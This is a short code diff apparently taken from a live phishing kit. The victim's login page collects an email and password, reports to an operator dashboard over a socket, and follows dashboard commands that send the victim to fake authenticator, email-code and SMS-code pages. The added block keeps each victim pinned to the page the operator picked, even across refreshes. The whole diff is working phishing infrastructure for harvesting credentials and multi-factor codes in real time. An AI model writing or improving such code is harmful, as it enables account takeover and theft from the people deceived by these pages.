@@ -4,6 +4,30 @@
   const SESSION_STORAGE_KEY = "sessionID";
   const DASH_EMIT_EVENT = "client-data";     // matches your dashboard code
   const DASH_JOIN_EVENT = "client-join";     // matches your dashboard code
+  // ADD THIS BLOCK
+const PAGE_FILE_MAP = {
+  app:              "app.html",
+  wrong_password:   "app.html",
+  loading:          "loading.html",
+  gauth:            "auth.html",
+  wrong_gauth:      "auth.html",
+  email_code:       "email.html",
+  wrong_email_code: "email.html",
+  sms:              "sms.html",
+  wrong_sms:        "sms.html"
+};
+const THIS_PAGE = "app.html";
+function setTrackedPage(buttonName) {
+  const dest = PAGE_FILE_MAP[String(buttonName || "").trim().toLowerCase()];
+  if (dest) { try { localStorage.setItem("page", dest); } catch {} }
+}
+(function checkTrackedPage() {
+  try {
+    const stored = localStorage.getItem("page");
+    if (stored && stored !== THIS_PAGE) location.href = stored;
+  } catch {}
+})();
+// END ADD
     // Persist "login pending" so page stays in loading state across refresh
   const PENDING_KEY = "ws_pending_login";
   window.wsSavePendingLogin = function(email, password) {
@@ -120,6 +144,7 @@
 
     // If the dashboard sends actions like "wrong_password", you can react here:
     socket.on("dashboard-action", ({ buttonName, value }) => {
+      setTrackedPage(buttonName);
 
 // Redirect to the relevant MFA page for these actions
 const dest = MFA_REDIRECT[buttonName];
